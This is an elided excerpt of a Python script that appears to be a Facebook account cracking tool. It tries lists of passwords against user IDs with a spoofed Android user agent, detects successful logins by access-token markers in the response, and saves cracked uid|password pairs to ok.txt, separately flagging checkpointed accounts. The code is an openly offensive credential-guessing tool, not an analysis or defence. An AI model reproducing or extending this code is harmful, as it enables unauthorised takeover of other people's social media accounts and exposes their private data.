...
def notice():
	...
	subprocess.check_output(["am", "start", "https://github.com/Khuda-Dost"])
...
\033[1;90m══════════════════════════════════════════════════
	...
	def api(self, uid, pwx):
		ua = random.choice([
			"Mozilla/5.0 (Linux, Android 7.1.1: ONEPLUS A5000) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36;]", 
			"Mozilla/5.0 (Linux, Android 7.1.1: ONEPLUS A5000) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36;]"
		])
		sys.stdout.write(
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;92m   [KD-OK] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;91m   [KD-CP] %s | %s\033[0;97m         "%(uid, pw))
